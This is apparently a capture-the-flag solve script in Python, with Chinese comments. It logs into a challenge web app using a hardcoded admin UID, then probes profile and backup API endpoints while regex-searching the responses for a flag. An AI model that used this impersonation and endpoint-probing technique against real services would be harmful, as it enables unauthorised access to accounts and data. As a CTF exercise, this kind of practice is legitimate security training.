import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - API 测试")
print(f"[*] Target: {BASE_URL}")
print()

# 登录 ADMiN
uid = "3553c1effa0b4698895a4874cfbd86d8"

print(f"[*] 登录 ADMiN (UID: {uid})")
login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
print(f"    POST /login: {login_resp.status_code}")

# 调用 /api/profile
print(f"\n[*] 调用 /api/profile API")

profile_resp = session.post(f"{BASE_URL}/api/profile", 
    json={"uid": uid},
    headers={"Content-Type": "application/json"})
print(f"    POST /api/profile: {profile_resp.status_code}")
print(f"    Response: {profile_resp.text}")

# 分析响应
if "username" in profile_resp.text:
    print(f"    [!] 找到 username!")
    
    # 提取 username
    username_match = re.search(r'"username"\s*:\s*"([^"]+)"', profile_resp.text)
    if username_match:
        username = username_match.group(1)
        print(f"    [+] username: {username}")

if "role" in profile_resp.text:
    print(f"    [!] 找到角色!")
    
    # 提取角色
    role_match = re.search(r'"role"\s*:\s*"([^"]+)"', profile_resp.text)
    if role_match:
        role = role_match.group(1)
        print(f"    [+] role: {role}")

if "admin" in profile_resp.text.lower():
    print(f"    [!!!] 可能是管理员!")

print()

# 尝试其他 API 路径
print(f"[*] 尝试其他 API 路径")

api_paths = [
    "/api/backup",
    "/api/admin/backup",
    "/api/user/backup",
]

for path in api_paths:
    print(f"    [-] {path}")
    resp = session.post(f"{BASE_URL}{path}", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        Status: {resp.status_code}")
    
    if resp.status_code != 404:
        print(f"        [!] Response: {resp.text[:300]}")
        
        if "flag" in resp.text.lower():
            print(f"        [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"        [!!!] Flag: {flag_match.group()}")

print()
print("[*] 完成!")
